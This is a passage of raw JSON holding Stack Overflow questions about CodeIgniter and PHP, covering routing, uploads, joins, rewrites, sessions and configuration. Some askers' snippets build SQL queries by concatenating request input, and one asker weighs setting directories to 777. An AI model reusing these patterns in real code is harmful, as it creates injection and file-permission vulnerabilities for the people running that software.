?&gt; \" /&gt; &lt;?php echo $data-&gt;menu_nama ?&gt; &lt;br /&gt;\n&lt;?php endforeach; ?&gt;&lt;/td&gt;\n</code></pre>\n\n<p></p>\n\n<p>What I want get in the form:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>User 1 :[v] Edit Data\n        [v] Print Data\n        [ ] Edit User\n        [v] Edit Index\n        [v] View Index\n\nUser 2 :[ ] Edit Data\n        [v] Print Data\n        [ ] Edit User\n        [ ] Edit Index\n        [v] View Index\n</code></pre>\n\n<p>My question is how I get the checked box (if have number in <code>menu_name</code>) and how I update the table menu. For example if user 2, I check on edit data and edit index the database will update:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Menu_name | menu_allowed\nEdit_data | +1+2+3+\nPrint_data| +1+2+3+\nEdit_user | +1+\nEdit_index| +1+2+3+\nview_index| +1+2+3+\n</code></pre>\n"},{"tags":["php","codeigniter","upload"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":101,"score":0,"question_id":12481856,"title":"CodeIgniter Uploading Large Files","body":"<p>I have set up codeigniter to upload small files &lt; 2MB  and that works fine. But I am having trouble uploading large files 20MB > </p>\n\n<pre><code>   function stage1()\n    {\n    ini_set('upload_max_filesize', '200M');\n    ini_set('post_max_size', '200M');                               \n    ini_set('max_input_time', 3000);                                \n    ini_set('max_execution_time', 3000);\n\n    $config['upload_path'] = './temp/';\n    $config['allowed_types'] = 'zip';\n\n    $this-&gt;load-&gt;library('upload', $config);\n    $this-&gt;upload-&gt;initialize($config);                             \n    if(!$this-&gt;upload-&gt;do_upload('userfile'))                       \n    {\n      $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());   \n      $this-&gt;load-&gt;view('upload_form', $error);                     \n    }\n    else\n    {\n      $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());        \n      //do stuff\n    }\n  } \n</code></pre>\n\n<p>I am not sure what is wrong with the above code. I overrode the php.ini to accept larger files and to take more time executing the script but it still returns the same error:</p>\n\n<pre><code>You did not select a file to upload.\n</code></pre>\n\n<p>Again, this works with small files but not large ones. </p>\n\n<p>EDIT: Turns out my server provider has limited file uploads so there is no solution besides to FTP the file in.</p>\n"},{"tags":["php","codeigniter","config","route"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12480912,"title":"codeigniter conditional routing","body":"<p>I am trying to setup routing based on the 1st URI segment.</p>\n\n<p>I have a rule:</p>\n\n<pre><code>$route['(:any)'] = pages/view_page/$1;\n</code></pre>\n\n<p>I want to make my routes conditional so that if a controller of the name of URI segment 1 is called it goes to the controller as normal.\nIf no controller exists then go to the pages/view_page function.</p>\n\n<p>I have tried wrapping the $route rule with an if statement that checks URI segment 1 and uses that to see if a file exists to match it but this doesn't seem to work.</p>\n\n<p>Does anybody have any suggestions for how to do this without having to write lots of route configurations.</p>\n"},{"tags":["php","mysql","database","codeigniter","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":3,"view_count":97,"score":0,"question_id":12466383,"title":"mysqli query succeeds but gives error number 0","body":"<p>My apologies for being a slightly broader question then most like but i can't find any help throughout the internet for this. I'm working on a site where i am not in charge of the database (yes its very problematic) and i was told to use a stored procedure to insert data into a table. </p>\n\n<p>The query is being run. It inserts the data into the table but something else is triggering the error.</p>\n\n<p>My question is: Is there anything in this code that would trigger that error or is it something in the stored procedure? What can i do to test for it? Any suggestions at all? I can't figure out what the error number : 0 actually is.</p>\n\n<p>I'm using codeigniter framework. Here's the code:</p>\n\n<pre><code> public function addScopeContent () {\n    $cn = '%';\n    $gp = $this-&gt;input-&gt;post('group');\n    $co = $this-&gt;input-&gt;post('company');\n    $ci = $this-&gt;input-&gt;post('city');\n    $dp = '%';\n\n    if ($gp == 'BU000') {\n        $gp = '%';\n    }\n    if ($co == 'CO000') {\n        $co = '%';\n    }\n    if ($ci == 'CI000') {\n        $ci = '%';\n    }\n\n    $location = $cn .'-'. $gp .'-'. $co .'-'. $ci .'-'. $dp;\n\n    $query = $this-&gt;db-&gt;query('call rollout_systems_multiimport('. $this-&gt;session-&gt;userdata('scopeId') .', \"'. $location .'\")');\n    if ($query) {\n        redirect('discovery/addContent');\n    }\n}\n</code></pre>\n\n<p>This is the stored procedure:</p>\n\n<pre><code>  CREATE DEFINER=`root`@`localhost` PROCEDURE `rollout_systems_multiimport`(\n  var_scope_id varchar(250),\n  var_searchString varchar(250))\n  BEGIN\n\n  Insert into rollout_systems\n  (`sys_name`, `sys_serial`, `eam_model`, `EOL_date`, `eam_user`, `scope_id`)\n  select `ad_name`,`eam_Serial_Number`,`eam_Model`,`Model_EOL`,`ad_account`,var_scope_id\n  from `disc_userpool` inner join `disc_systempool`\n  on `ad_account` = `user_aurora_id`\n  Where `disc_userpool`.`location_code` like var_searchString;\n</code></pre>\n\n<p>NOTE: I just tried changing the dbdriver in the database.php page from mysqli to mysql. It doesnt give an error anymore.</p>\n"},{"tags":["php","codeigniter","access-control"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12481934,"title":"File access control in PHP","body":"<p>I know that PHP &amp; CodeIgniter have access control and there are a lot of topics discussing this, but I think my case is slightly different.\nI have a web sever A and intend to buy a separated <a href=\"http://www.vodien.com/singapore-content-delivery-web-hosting.php\" rel=\"nofollow\">video host B.</a> The website on server A has a page for viewing video and it actually gets video data from video host B. Is it possible to force user to log in at server A first before they can see the video? I mean, if a user somehow gets the link to the video at host B, he can share that link to his friends. Those unauthenticated people can see the video and I don't want this. How can I do access control like that?\nThank you.</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12423,"score":0,"question_id":5175161,"title":"Trying to get property of non-object - CodeIgniter","body":"<p>I'm trying to make update form, that is going to retrieve the data for the specific ID selected, and fill in the form, so its going to be available for updating.</p>\n\n<p>When I click edit on the specific entry (Product in my case), it takes me to the <code>edit_product_view</code>, but states the error <strong>\"Trying to get property of non-object\"</strong> for every variable that I use in <code>set_values</code> of the form elements.</p>\n\n<p>Using <code>print_r</code>, I get the correct associative array, so it's passed correctly.</p>\n\n<p>This is excerpt of my <code>edit_product_view</code>.</p>\n\n<pre><code>&lt;h2&gt;&lt;?php echo $heading; ?&gt;&lt;/h2&gt;\n&lt;hr&gt;\n&lt;table id=\"newproduct\"&gt;\n&lt;?php echo form_open('products/edit/'.$product-&gt;id); ?&gt;\n&lt;tr&gt;\n    &lt;td class=\"label\"&gt;&lt;?php echo form_label('Name:');?&gt;&lt;/td&gt;\n    &lt;td&gt;&lt;?php echo form_input('prodname', set_value('prodname', $product-&gt;prodname));?&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n    &lt;td class=\"label\"&gt;&lt;?php echo form_label('Product Type:');?&gt;&lt;/td&gt;\n    &lt;td&gt;&lt;?php echo form_dropdown('ptname_fk', $product_types, set_value('ptname_fk', $product-&gt;ptname_fk));?&gt;&lt;/td&gt;\n&lt;/tr&gt;\n</code></pre>\n\n<p><code>$product</code> is the array holding all the key-value pairs, but I cannot fill the form for some reason.</p>\n\n<p>Thank you in advance!</p>\n"},{"tags":["codeigniter","netbeans","netbeans-7"],"answer_count":2,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":3870,"score":4,"question_id":9308604,"title":"How to integrate codeIgniter with netbeans fully","body":"<p>I downloaded Netbeans and CodeIgniter, and I downloaded 2 plugins for Netbeans. On of them is called \"PHP CI Framework\" and I can't install it.</p>\n\n<p>When I try to install it I get this message:</p>\n\n<pre><code>The plugin php apis is requested in implementation version 201107282000.\n\nThe following plugin is effected:\n\nPHP CI Framework\n</code></pre>\n\n<p>What other plugin do I need to install for CI to be fully integrated so that I will have full Intellisense and documentation support in Netbeans?</p>\n"},{"tags":["function","codeigniter","sql-injection","built-in","data-security"],"answer_count":5,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":2468,"score":5,"question_id":5857386,"title":"how to avoid sql injection in codeigniter","body":"<p>In CodeIgniter, how can I avoid sql injection?  Is there any method to set in config file to avoid sql injection?  I am using this code for selecting values:</p>\n\n<pre><code>$this-&gt;db-&gt;query(\"SELECT * FROM tablename WHERE var='$val1'\");\n</code></pre>\n\n<p>and this for inserting values:</p>\n\n<pre><code>$this-&gt;db-&gt;query(\"INSERT INTO  tablename (`var1`,`var2`) VALUES ('$val1','$val2')\");\n</code></pre>\n\n<p>Another method used to insert and select values from the database is CodeIgniter's <code>insert()</code> and <code>get()</code> methods. Is any chance to sql injection while using CodeIgniter's bulit-in functions  </p>\n"},{"tags":["php",".htaccess","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12447282,"title":"redirect domain to www on codeigniter","body":"<p>What would be the best way to redirect codeigniter website to www domain? The only way that comes to my mind is to use htaccess for this but can't figure out exactly how. This is the rewrite rule I'm using right now to remove index.php from the url. How should I add the redirection to www domain correctly?</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|images|assets|uploads|robots\\.txt|favicon\\.png|favicon\\.ico)\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n"},{"tags":["codeigniter","frameworks","codeigniter-2"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":167,"score":0,"question_id":9561949,"title":"code igniter framework guidance for beginners","body":"<p>I am just a beginner in <code>code igniter</code>. I have just downloaded the code igniter framework. But i don't know that where should i keep my html, php files and stylesheets, images etc. Is there any procedure to do the things? Please guide me.</p>\n"},{"tags":["mysql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12473984,"title":"Access multiple DBs using one connection and one query via codeigniter","body":"<p>I have a question regarding mysql db and codeigniter framework</p>\n\n<p>I want to use one query accessing multiple DBs using <strong>codeigniter</strong> which returns one resultset\nExample as follow:</p>\n\n<pre><code>SELECT A.name, B.class_name\nFROM DB1.Table1 AS A, DB2.Table1 AS B\nWHERE A.id = B.id\n</code></pre>\n\n<p>Return one result????</p>\n\n<p>Following are my connection setting in codeigniter</p>\n\n<pre><code>$db['DB2']['hostname'] = 'localhost';\n$db['DB2']['username'] = 'connection_name';\n$db['DB2']['password'] = 'connection_password';\n$db['DB2']['database'] = 'DB2';\n$db['DB2']['dbdriver'] = 'mysql';\n$db['DB2']['dbprefix'] = '';\n$db['DB2']['pconnect'] = TRUE;\n$db['DB2']['db_debug'] = TRUE;\n$db['DB2']['cache_on'] = FALSE;\n$db['DB2']['cachedir'] = '';\n$db['DB2']['char_set'] = 'utf8';\n$db['DB2']['dbcollat'] = 'utf8_general_ci';\n$db['DB2']['swap_pre'] = '';\n$db['DB2']['autoinit'] = TRUE;\n$db['DB2']['stricton'] = FALSE;\n\n\n$active_group = 'default';\n$active_record = TRUE;\n\n$db['default']['hostname'] = 'localhost';\n$db['default']['username'] = 'connection_name';\n$db['default']['password'] = 'connection_password';\n$db['default']['database'] = 'DB1';\n$db['default']['dbdriver'] = 'mysql';\n$db['default']['dbprefix'] = '';\n$db['default']['pconnect'] = TRUE;\n$db['default']['db_debug'] = TRUE;\n$db['default']['cache_on'] = FALSE;\n$db['default']['cachedir'] = '';\n$db['default']['char_set'] = 'utf8';\n$db['default']['dbcollat'] = 'utf8_general_ci';\n$db['default']['swap_pre'] = '';\n$db['default']['autoinit'] = TRUE;\n$db['default']['stricton'] = FALSE;\n</code></pre>\n\n<p>Kindly provide me some sample code which helps to run the above query.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["php","ajax","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12476618,"title":"Failed to reload content via Ajax","body":"<p>OK, so basically this is my issue :</p>\n\n<ul>\n<li>I've got a dynamic page with a table in it</li>\n<li>When the user clicks to delete an entry, the entry is deleted from the db and the table is reloaded (via a controller) using Ajax</li>\n<li>However, even when the content is re-fetched, it keeps showing the PREVIOUS version of my contents (as if the page was somehow cached?). If I reload the whole page, it shows up alright...</li>\n</ul>\n\n<p>What could be going on?</p>\n"}]}
{"total":13987,"page":17,"pagesize":100,"questions":[{"tags":["codeigniter","expressionengine"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12474978,"title":"expression engine and code igniter to use same system folder","body":"<p>I'm trying to get expression engine and code igniter to use the same 'system folder'.\nI have both latest versions </p>\n\n<ul>\n<li>'Code Igniter 2.1.2' and  </li>\n<li>'Expression Engine 2.5.3'.</li>\n</ul>\n\n<p>The issue i'm seeing is that both 'system's folder have quite major differences where as </p>\n\n<ul>\n<li>Code Igniter specifically states it's using  CI VERSION 2.1.2 while </li>\n<li>Expression Engine is using CI VERSION 2.0.1</li>\n</ul>\n\n<p>Has anyone been through this and found a way to use a compromise of both?</p>\n"},{"tags":["php","excel","codeigniter","phpexcel"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":126,"score":0,"question_id":12467644,"title":"how to handle large sets of data with PHP?","body":"<p>My web application lets user import an excel file and writes the data from the file into the mysql database.\nThe problem is, when the excel file has lots of entries, even 1000 rows, i get an error saying PHP ran out of memory. This occurs while reading the file.\nI have assigned 1024MB to PHP in the php.ini file.</p>\n\n<p>My question is, how to go about importing such large data in PHP.</p>\n\n<p>I am using CodeIgniter. \nfor reading the excel file, i am using <a href=\"http://code.google.com/p/php-excel-reader/\" rel=\"nofollow\">this</a> library.</p>\n\n<hr>\n\n<p>SOLVED. I used CSV instead of xls. and I could import 10,000 rows of data within seconds.\nThank you all for your help.</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12465346,"title":"How can I process a form that is common for multiple views and controllers?","body":"<p>I have a site where most pages have a common form displayed. The form code is located in a separate file and loaded in each view like so:</p>\n\n<pre><code>&lt;?php $this-&gt;load-&gt;view('includes/quote'); ?&gt;\n</code></pre>\n\n<p>I did this so that I don't have to duplicate the code in every controller and view. The form data will be used to create an email. The form is displayed properly but I can't figure out how to process the input data. Since there are multiple controllers involved do I need to create a separate controller to process the data? What is the best way to handle this type of situation?</p>\n"},{"tags":["codeigniter","csrf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12475053,"title":"How to optionally change the CSRF name in security class","body":"<p>I have post data coming from an external cURL POST.  I do not have the ability to add any custom defined fields to the post back but I can stuff the CSFR token into another empty input for post back to my app.  Is it feasible to do this and then modify the security class to look for the unique input name in _POST data when the expected csfr_token isn't found?</p>\n\n<p>If this solution makes sense then any suggestions on how to implement will be more than appreicated.</p>\n"},{"tags":["php","codeigniter","email","imap","pop3"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12474598,"title":"Read Email PHP POP","body":"<p>For my project i need to read Emails using <code>POP</code> </p>\n\n<p>I am using the IMAP extension for PHP.</p>\n\n<p>I do not need to fetch all the emails , but get emails by filtering <code>TO</code> and <code>FROM</code> .</p>\n\n<p>it works with <code>FROM</code> not with <code>TO</code></p>\n\n<p>What i tried is </p>\n\n<p><strong>(TO fetch all email <code>FROM</code> user@domain.com)</strong></p>\n\n<pre><code>$mbox = imap_open (\"{pop.domain.net:995/pop3/ssl/novalidate-cert}\", \"username\", \"password\")or die(imap_last_error());\n$some   = imap_search($mbox, 'FROM \"user@domain.com\"',SE_UID);\nimap_close($mbox);  \nvar_dump($some);\n</code></pre>\n\n<p>it works and i am getting an array .</p>\n\n<p><strong>(To fetch all email that which send to user@domain.com using <code>TO</code>)</strong></p>\n\n<pre><code>$mbox = imap_open (\"{pop.domain.net:995/pop3/ssl/novalidate-cert}\", \"username\", \"password\")or die(imap_last_error());\n    $some   = imap_search($mbox, 'TO \"user@domain.com\"',SE_UID);\n    imap_close($mbox);  \n    var_dump($some);\n</code></pre>\n\n<p>Whats wrong with me ? Please note that i am not specifying any mailbox name here ,for IMAP i need to mention the Mailbox name.</p>\n\n<p>Please help me.</p>\n"},{"tags":["php","javascript","ajax","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":12474146,"title":"Pass id from php to JS file","body":"<p>I know very well that this question is ask many time but some how my problem is different and i didn't find the solution.</p>\n\n<p>Now comes on issue.</p>\n\n<p>I have a an image,so whenever i click on to the image the pop up window is open and show the data.now i want to make this dynamic and wants that the data should be come according to the id.</p>\n\n<p>here is my image code.:</p>\n\n<pre><code>&lt;div id='contact-form'&gt;\n\n        &lt;a href='#' class='contact'&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;/assets/images/pre.jpg\" style=\"height:18px; width:18px\"&gt;&lt;/a&gt;\n      &lt;/div&gt;\n        &lt;!-- preload the images --&gt;\n        &lt;div style='display:none'&gt;\n            &lt;img src='&lt;?php echo base_url();?&gt;assets/images/img/contact/loading.gif' alt='' /&gt;\n        &lt;/div&gt;  \n\n\nAnd on its click the ajax is called from js file here is the code of that js file:\n//here the provider is controller and show_coupon_pre is a function which call the view having the data.\n$.get(\"provider/show_coupon_pre\", function(data){\n                    // create a modal dialog with the data\n                    $(data).modal({\n                        closeHTML: \"&lt;a href='#' title='Close' class='modal-close'&gt;x&lt;/a&gt;\",\n                        position: [\"15%\",],\n                        overlayId: 'contact-overlay',\n                        containerId: 'contact-container',\n                        onOpen: contact.open,\n                        onShow: contact.show,\n                        onClose: contact.close\n                    });\n                });\n</code></pre>\n\n<p>I have a table having no of records and each record having this type of image.where the user can click and get the preview in pop  window.\nBut i want to show the data in pop up according to the row like for id=1 it should be show the data of id==1 and so on. now can you you guys please help me how can i pass this id to the js file by which i can fetch the required data.</p>\n\n<p>I am working in codeignitor.</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":1,"view_count":93,"score":4,"question_id":12446972,"title":"Codeigniter: Join 3 tables and display data in view","body":"<p>So I have 3 tables I wish to join.</p>\n\n<p>I am building an app i Codeigniter and I have 3 tables </p>\n\n<p><strong>Client:</strong><br>\n-id<br>\n-phone_number<br>\n-hospital_id<br>\n-smc_status<br>\n-testing_center_id  </p>\n\n<p><strong>Hospital</strong><br>\n-id<br>\n-name  </p>\n\n<p><strong>Testing_center</strong><br>\n-id<br>\n-name  </p>\n\n<p>In the model,I have this:</p>\n\n<pre><code>public function get_clients()\n    {\n        if($slug === FALSE)\n        {\n            $this-&gt;db-&gt;select('clients.*');\n            $this-&gt;db-&gt;from('clients');\n            $this-&gt;db-&gt;join('hospital', 'clients.id = hospital.id');\n            $this-&gt;db-&gt;join('testing_center', 'clients.id = testing_center.id');\n            $query = $this-&gt;db-&gt;get();\n\n            return $query-&gt;result_array();\n        }\n\n        $query = $this-&gt;db-&gt;get_where('clients');\n        return $query-&gt;row_array();\n    }\n</code></pre>\n\n<p>In the view I have:</p>\n\n<pre><code>&lt;tbody&gt;\n    &lt;?php foreach ($clients as $client_item): ?&gt;\n    &lt;tr&gt;\n        &lt;td&gt;&lt;?php echo $client_item['phone_number'] ?&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;?php echo $client_item['smc_status'] ?&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;?php echo $client_item['hospital_id'] ?&gt;&lt;/td&gt; //i wish to have the hospital name here\n        &lt;td&gt;&lt;?php echo $client_item['testing_center_id'] ?&gt;&lt;/td&gt; //i wish to have the testing center name here\n        &lt;td&gt;&lt;?php echo $client_item['language'] ?&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;a href=\"#\"&gt;View&lt;/a&gt;&lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;?php endforeach ?&gt;\n&lt;/tbody&gt;\n</code></pre>\n\n<p>But that is because I have failed to show the hospital name and the testing center name on the third and fourth td. How can I go about that? I tried a few techniques that just did not seem to work for some reason. Please advise</p>\n"},{"tags":["php","codeigniter","form-validation"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":12473124,"title":"Form validation custom message in codeigniter?","body":"<p>In codeigniter I have used codeigniter form validation library in many controller,</p>\n\n<p>ex: -  </p>\n\n<blockquote>\n  <p>$this->form_validation->set_rules('rank', 'Rank', 'required');</p>\n</blockquote>\n\n<p>If form validation failed, Then it displays </p>\n\n<pre><code>         \"The Rank field is required.\"\n</code></pre>\n\n<p>Here I want to display custom message,One method I can follow is </p>\n\n<blockquote>\n  <p>$this->form_validation->set_message('required', '%s can not be blank');</p>\n</blockquote>\n\n<p>If I using this method then I need to repeat this code in every controller wherever I am using \"required\" form validation method</p>\n\n<p>My question is there is any method to declare  this  custom message in configure file and automatically use this custom message whenever I using form validation rule \"required\"?</p>\n"},{"tags":["php","oop","mvc","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":353,"score":3,"question_id":6272404,"title":"Reusing forms and controllers in Codeigniter","body":"<p>I'm learning the OO and MVC paradigm (using Codeigniter and PHP). I continue to find warnings such as this: <em>If you find yourself pasting the same code into multiple files, then you aren't using OO/MVC properly</em>. So, here's a question for more experienced programmers.</p>\n\n<ol>\n<li><p>I have a create-user form that I am using two very similar versions of:</p>\n\n<ul>\n<li><p>Version 1 (at <code>/volunteer/register</code>) is created by an anonymous user. The form lives in the <code>volunteers</code> controller, and needs to be verified by an admin.</p></li>\n<li><p>Version 2 (at <code>/admin/create_volunteer</code>) is created by a logged-in admin. The form and validation is nearly the same, but it is submitted with different parameters.</p></li>\n</ul></li>\n<li><p>Another, similar example:</p>\n\n<p>I want to build different user dashboards that share a template, but will be used by different user roles and have different functions and information based on role. As I see it my choices are: </p>\n\n<ol>\n<li>Create a Dashboard controller with three functions defining the data loaded into the dashboard template.</li>\n<li>Add the a dashboard function to each role's controller (Volunteer, Admin etc).</li>\n<li>Create a controller for each case (Volunteer, Admin, etc.)</li>\n</ol></li>\n</ol>\n\n<p>I apologize if this appears sophomoric but essentially I'm looking for rules-of-thumb to determine how to design architecture in MVC.</p>\n\n<p>My questions:</p>\n\n<ul>\n<li>In the first example, is my logical choice of controllers (<code>Volunteer</code> &amp; <code>Admin</code>) less than ideal? Is code replication in this case an acceptable practice?</li>\n<li>Can anyone recommend architecting tools to establish logical consistency and good workflow for MVC?</li>\n</ul>\n"},{"tags":[".htaccess","codeigniter","mod-rewrite","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12471520,"title":"htaccess rewrite for codeigniter","body":"<p>I want to rewrite code for codeigniter url rewrite.</p>\n\n<p>I have used following code.</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /test/index.php?/$1 [L]\nRewriteRue ^list/shows/cid-([0-9]+).html /list/shows?cid=$1\n</code></pre>\n\n<p>note:\"test\" is my website dir.</p>\n\n<p>It is working well for index.php removal. But it doesn't work for url rewrite</p>\n\n<p>i want make <a href=\"http://example.com/test/list/shows?cid=1\" rel=\"nofollow\">http://example.com/test/list/shows?cid=1</a> </p>\n\n<p>become</p>\n\n<p><a href=\"http://example.com/test/list/shows/cid-1.html\" rel=\"nofollow\">http://example.com/test/list/shows/cid-1.html</a></p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":85,"score":-2,"question_id":12472096,"title":"Codeigniter: want to integrate some core php application in existing Codeigniter application..","body":"<p>what is best way to integrate core php module in codeigniter application without changing any code in core php module..can anyone help me in this?</p>\n"},{"tags":["codeigniter","session","cookies","delete"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":79,"score":0,"question_id":12472383,"title":"CODEIGNITER how to delete all sessions and cookies","body":"<p>I'm wondering if is there any way to remove all domain site cookies and sessions params.</p>\n\n<p>somenthing like <code>$this-&gt;session-&gt;destroy();</code>? </p>\n\n<p>thanks</p>\n"},{"tags":["php","mysql","sql","database","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":61,"score":-1,"question_id":12471034,"title":"sql condition to display record","body":"<p>tbl_users</p>\n\n<pre><code>u_id | u_type | u_first_name\n 1      U        I_am_user\n 2      E        I_am_emp   \n 3      E        I_am_emp2\n</code></pre>\n\n<p>tbl_order</p>\n\n<pre><code>o_id | u_id | e_id | o_status | pay_status\n  1     1       0    pending    Unpaid\n  2     1       2    pick       Paid\n  3     1       0    pending    Unpaid\n  4     1       3    Pick       paid\n</code></pre>\n\n<p>I tried this query to show user and emp name </p>\n\n<pre><code>SELECT o.*, a.u_first_name as user, b.u_first_name as emp\n  FROM `tbl_order` AS o\n       LEFT JOIN tbl_users AS a ON a.u_id = o.u_id \n       LEFT JOIN tbl_users AS b ON b.u_id = o.e_id\n\no_id | u_id | e_id |  user |  emp | pay_staus\n</code></pre>\n\n<p>How would we give condition(order by or other 1) to display unpaid (<code>pay_status</code>) record first \nthen <code>e_id=0</code> record then rest all?</p>\n"},{"tags":["php","codeigniter","multilingual"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12470485,"title":"How to add multiple languages in codeigniter site","body":"<p>I am developing a site with codeigniter, i want to include multiple language in that site. That is my home page contain a drop down list with multiple language. By selecting each language the over all site should be change to the selected language. How it is possible in codeigniter. Thanks in advance.</p>\n"},{"tags":["php","linux","codeigniter","permissions","user-permissions"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":12462401,"title":"linux permission issue with Multi Language admin in Code Igniter","body":"<p>I have created an admin panel in to add new languages for the CI application...</p>\n\n<p>This was required because the client need to put about 20 languages, he has provided all the text of pages which need to be in different languages and they are mostly informative texts which may change in future..</p>\n\n<p>So, I created the admin panel to load a list of all existing directories from <code>Language directory</code> and a simple CRUD is there to create the new language php file.</p>\n\n<p>All is working fine but the issue is that my <code>apache user</code> at the server is different from the <code>FTP user</code>, and I am unable to remove the file / folder from ftp. to do so I have a few things in mind:</p>\n\n<ol>\n<li>CHMOD the new folder and language PHP file to 777 {though I do it to write but then change it to 755 after file is written}</li>\n<li>Place the new language folder/file to somewhere else out of application folder so I can 777 it without any harm.. { looked for it but unable to find any help }</li>\n<li>no idea what to do...</li>\n</ol>\n\n<p>I already have set <code>777</code> to <code>language directory</code> to let the Apache user write in the directory</p>\n\n<p>I have a solution to change the owner of the project from <code>ftp user to apache</code> but, then wont be able to access files from ftp so I asked my network guy to add the apache user to the same group so I can change the permission to 775 but he is not sure if it will work or not and is not changing the group for apache user.</p>\n\n<p>Main concern right now is making <code>...application/language</code> and <code>...application/language/*/*</code> 777 is fine or not?</p>\n\n<p>If there is any-other alternative to it please let me know I can change the entire process if its gona work</p>\n\n<p>Regards</p>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12409312,"title":"Shortening urls with htaccess","body":"<p>Am using Codeigniter for my site and i want to shorten my urls to look a lot nicer but it cant seem to work. am using the htaccess method and this is my code below.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\nRewriteCond $1 !^(index\\.php|(.*)\\.swf|user_guide|profiles|images|min|assets|robots\\.txt)\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n\nRewriteEngine On\n\nRewriteBase /gicfamily/\n\nRewriteRule ^([a-zA-Z0-9]+)$ gallery?var=$1\n</code></pre>\n\n<p></p>\n\n<p>I want gicfamily.org/gallery?var=photos\nto look like gicfamily.org/gallery/photos\nThanks in ad.</p>\n\n<p>My config file looks something like this:</p>\n\n<pre><code>&lt;?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\n\n$config['base_url'] = '';\n\n\n$config['index_page'] = '';\n\n\n$config['uri_protocol'] = 'AUTO';\n\n$config['url_suffix'] = '';\n\n$config['language'] = 'english';\n\n\n$config['charset'] = 'UTF-8';\n\n\n$config['enable_hooks'] = FALSE;\n\n\n$config['subclass_prefix'] = 'MY_';\n\n\n\n$config['permitted_uri_chars'] = 'a-z 0-9~%.:_\\-';\n\n\n$config['allow_get_array']      = TRUE;\n$config['enable_query_strings'] = FALSE;\n$config['controller_trigger']   = 'c';\n$config['function_trigger']     = 'm';\n$config['directory_trigger']    = 'd'; // experimental not currently in use\n\n\n$config['log_threshold'] = 0;\n\n\n$config['log_path'] = '';\n\n$config['log_date_format'] = 'Y-m-d H:i:s';\n\n$config['cache_path'] = '';\n\n\n$config['encryption_key'] = 'ksfkvjbskfbvskbvlbsbvsokbskdb';\n\n\n$config['sess_cookie_name']     = 'gic_session';\n$config['sess_expiration']      = 7200;\n$config['sess_expire_on_close'] = TRUE;\n$config['sess_encrypt_cookie']  = FALSE;\n$config['sess_use_database']    = TRUE;\n$config['sess_table_name']      = 'gic_sessions';\n$config['sess_match_ip']        = FALSE;\n$config['sess_match_useragent'] = TRUE;\n$config['sess_time_to_update']  = 300;\n\n$config['cookie_prefix']    = \"\";\n$config['cookie_domain']    = \"\";\n$config['cookie_path']      = \"/\";\n$config['cookie_secure']    = FALSE;\n\n$config['global_xss_filtering'] = FALSE;\n\n$config['csrf_protection'] = 